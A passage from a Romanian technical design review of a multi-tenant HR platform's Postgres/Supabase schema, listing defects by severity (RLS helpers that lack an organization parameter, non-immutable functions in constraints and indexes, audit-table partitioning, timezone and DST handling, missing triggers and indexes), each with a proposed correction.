  CORECTIE: O singură migrare canonică `0001_core.sql` care definește enum-urile, `organizations`, `profiles`, `organization_members`, `role_permissions`, `platform_admins`, `audit_logs`; celelalte documente devin consumatori și nu redefinesc nimic. Alege un singur vocabular (identificatori SQL în engleză, etichete românești în i18n) și un singur model de membership. Verifică și clauzele `ON CONFLICT (organization_id, role, resource, action) WHERE deleted_at IS NULL`: predicatul de inferență nu implică predicatul indexului parțial (`organization_id IS NOT NULL AND deleted_at IS NULL`), deci inferența eșuează la runtime. Rulează `supabase gen types` în CI și diff-uiește.
- [CRITIC] Multi-organizație — helperi RLS fără parametru de org
  PROBLEMA: Modulele leave, inventory/onboarding/announcements și părți din hr-core scriu RLS cu `current_org_id()`, `current_employee_id()` (fără argument), `is_hr()`, `is_org_admin()`, `has_perm(text)` — toți presupun că există „organizația activă" în contextul bazei de date. Nu există niciun mecanism care s-o pună acolo (nu e claim în JWT — decizie explicită în app-arch — și nu e GUC setat de PostgREST), deci funcțiile fie nu se pot implementa, fie s-ar implementa citind un claim, ceea ce contrazice frontal decizia din app-arch §2: „RLS nu trebuie să depindă de organizația activă". Consecință concretă: un utilizator membru în două firme (cazul explicit din cerințe) vede `announcements`, `leave_requests` și `checklist_instances` doar dintr-o organizație, iar dacă mecanismul lipsește — din niciuna; `announcements_select_audienta` cu `organization_id = app.current_org_id()` devine o politică fie mereu goală, fie influențabilă din client.
  CORECTIE: Interzice prin convenție orice helper fără parametru `p_org`. Semnături unice: `app.is_member(uuid)`, `app.has_perm(uuid, text)`, `app.current_employee_id(uuid)`, `app.is_manager_of(uuid, uuid)`, `app.feature_on(uuid, text)` (azi există patru nume diferite pentru ultima). - [CRITIC] DDL — CHECK cu funcții non-IMMUTABLE
  PROBLEMA: Cel puțin nouă constrângeri folosesc `current_date` / `now()` în CHECK: `ssm_training_sessions.data <= current_date`, `ssm_trainings.data <= current_date`, `fire_extinguishers.data_fabricatie <= current_date`, `fire_extinguisher_checks.data <= current_date`, `occupational_health_exams.data <= current_date`, `equipment_meter_readings.citit_la <= now()`, `vehicles.an_fabricatie BETWEEN 1950 AND extract(year from current_date)+1`, `equipment.an_fabricatie` idem, `employees.data_nasterii < CURRENT_DATE - INTERVAL '15 years'`. - [CRITIC] DDL — index unic pe expresie STABLE (demo_requests)
  PROBLEMA: `demo_requests` are `UNIQUE(email, date_trunc('day', created_at)) WHERE deleted_at IS NULL`. `date_trunc(text, timestamptz)` este STABLE, nu IMMUTABLE (rezultatul depinde de `TimeZone`-ul sesiunii), deci Postgres respinge crearea indexului cu „functions in index expression must be marked IMMUTABLE". Migrarea nucleului nu trece, iar protecția anti-spam a singurului formular public al platformei nu există. Aceeași clasă de defect apare oriunde s-ar tăia o zi calendaristică dintr-un `timestamptz` într-un index.
  CORECTIE: Folosește varianta immutable cu fus explicit: `UNIQUE (email, ((created_at AT TIME ZONE 'Europe/Bucharest')::date)) WHERE deleted_at IS NULL` — `timezone(text, timestamptz)` este IMMUTABLE. - [CRITIC] audit_logs — PK pe tabelă partiționată + trei tabele de audit paralele
  PROBLEMA: Versiunea din core-authz §6 declară `id bigint generated always as identity primary key ... partition by range (created_at)`. Versiunea din core-schema o are corect (`PRIMARY KEY (id, created_at)`) dar cu alte coloane (`entity_type/entity_id/before/after/action audit_action` vs `table_name/record_id/before_data/after_data/action text`).   CORECTIE: O singură tabelă `public.audit_logs`, partiționată lunar, cu `PRIMARY KEY (id, created_at)` și un singur set de coloane; redenumește toate apelurile din module. Pe entitățile sensibile (`employee_sensitive_data`, `payroll_entries`, `invitations`) eșecul auditului trebuie să facă rollback tranzacției de business, nu warning — altfel garanția „audit la FIECARE citire de CNP" e doar declarativă. - [CRITIC] expirables — cheia de unicitate colapsează scadențele multiple
  PROBLEMA: `expirables` are `UNIQUE(entity_type, entity_id) WHERE deleted_at IS NULL`, dar designul SSM cere explicit trei rânduri pentru același stingător (verificare periodică, reîncărcare, probă de presiune), toate cu `entity_type='ssm_equipment'` și același `entity_id`, diferențiate doar prin `kind`. Actualizează toate `ON CONFLICT`-urile din trigger-ele de sincronizare să vizeze exact această listă plus predicatul `WHERE deleted_at IS NULL`, altfel inferența de index eșuează la runtime.

- [MARE] CI — testul de izolare RLS contrazice designul
  PROBLEMA: `tests/rls/tenant-isolation.spec.ts` afirmă că (a) TOATE tabelele din `public` trebuie să aibă `relforcerowlevelsecurity = true` și (b) fiecare tabelă trebuie să aibă politici pentru SELECT, INSERT, UPDATE ȘI DELETE. - [MARE] Retenție audit — DETACH PARTITION CONCURRENTLY în funcție + volum la 3 ani

Orice corp de funcție rulează într-o tranzacție, iar comanda nu poate rula într-un bloc tranzacțional → `25001` la fiecare execuție: retenția nu se aplică niciodată. - [MARE] UNIQUE-uri care blochează operațiuni legitime (soft delete și regularizare)
  PROBLEMA: Patru unicități se comportă greșit. (1) `payroll_periods UNIQUE(organization_id, an, luna) WHERE deleted_at IS NULL` interzice a doua perioadă pe aceeași lună, deși nota din același document impune corecțiile prin „perioadă de regularizare separată (an/luna + `is_regularizare`)" — coloană care nici nu există; prima corecție retroactivă (concediu medical adus târziu, diurnă peste plafon) blochează sistemul și singura ieșire rămasă utilizatorului e să șteargă logic o lună închisă. - [MEDIU] Europe/Bucharest — granițe de lună, pg_cron în UTC, DST pe tura de noapte
  PROBLEMA: Trei locuri unde fusul rupe calculul. (1) Rapoartele lunare de flotă și consum compară `timestamptz` cu `date`: `ts.sosire_la >= per.luna_start AND ts.sosire_la < per.luna_end`. Castul folosește `TimeZone`-ul sesiunii, care pe PostgREST/Supabase este UTC — o cursă încheiată pe 31 august la 23:30 ora locală intră în raportul lunii septembrie; documentul semnalează pericolul dar query-ul livrat nu aplică `AT TIME ZONE`. (2) Joburile `pg_cron` sunt descrise cu ore locale („02:15 Europe/Bucharest", „03:15", „07:30"), dar `cron.schedule` interpretează UTC — acumularea lunară de concediu rulează de fapt la 04:15/05:15 și se deplasează cu o oră la fiecare schimbare de oră; „1 ianuarie 00:30" pentru reportare rulează la 02:30 local, după ce utilizatorii timpurii pot depune deja cereri pe anul nou. (3) `attendance_entries.gross_minutes` se calculează pe `timestamp` naiv: în noaptea trecerii la ora de vară o tură 22:00–06:00 are 8 ore de ceas dar 7 ore reale (9 toamna), deci sporul de noapte se plătește greșit de două ori pe an.
  CORECTIE: (1) `WHERE ts.sosire_la >= (per.luna_start::timestamp AT TIME ZONE 'Europe/Bucharest') AND ts.sosire_la < (per.luna_end::timestamp AT TIME ZONE 'Europe/Bucharest')` — păstrează sargabilitatea, pentru că partea calculată e constantă. (2) Programează toate joburile în UTC explicit, cu comentariu care indică ora locală vizată, sau rulează orar cu ieșire imediată dacă `extract(hour from now() AT TIME ZONE 'Europe/Bucharest') <> N` — tiparul e deja propus în modulul de expirări, aplică-l consecvent. (3) Cazuri de test explicite în `computeAttendance()` pentru 29/30 martie și 25/26 octombrie; decizia (ore de ceas vs ore reale) se documentează în foaia „Legendă" a exportului.
- [MEDIU] leave_request_days — denormalizare fără sincronizare + FK neindexat
  PROBLEMA: `leave_request_days` copiază `status` și `department_id` de pe părinte, iar RLS și toate rapoartele se bazează pe copie (`d.status IN ('trimisa','aprobata_manager','aprobata')` pentru conflictul de echipă, `d.status='aprobata'` pentru absenteism). Nu este definit niciun trigger care să propage schimbarea de status — nota spune doar că tabela e „regenerată integral la fiecare modificare a cererii", ceea ce nu se întâmplă la aprobare (aprobarea schimbă doar statusul părintelui, prin `approval_instances`). Rezultat: cererile aprobate rămân `trimisa` în zile, raportul de absenteism raportează zero, calendarul de echipă arată starea greșită. În plus FK-ul `leave_request_id ON DELETE CASCADE` nu are index, iar regenerarea face `DELETE ... WHERE leave_request_id = $1` la fiecare editare → seq scan pe o tabelă care ajunge la ~500 angajați × 25 zile × 3 ani ≈ 37k rânduri per organizație.
  CORECTIE: Adaugă `CREATE INDEX ON leave_request_days (leave_request_id)` — obligatoriu pentru orice FK cu CASCADE — și un trigger `AFTER UPDATE OF status ON leave_requests` care propagă statusul în aceeași tranzacție. Alternativ, scoate `status` din copil și lasă join-ul pe părinte (RLS-ul copilului rămâne oricum pe `organization_id` + `employee_id`). Test de reconciliere nocturn: `count(days where status <> parent.status) = 0`.

## CRITICA: yagni-faze
VERDICT: Designul este solid tehnic — RLS, izolarea multi-tenant, versionarea valorilor legale și snapshot-urile imutabile sunt raționamente de inginer bun, iar testul generic de izolare merită construit în întregime în prima fază.
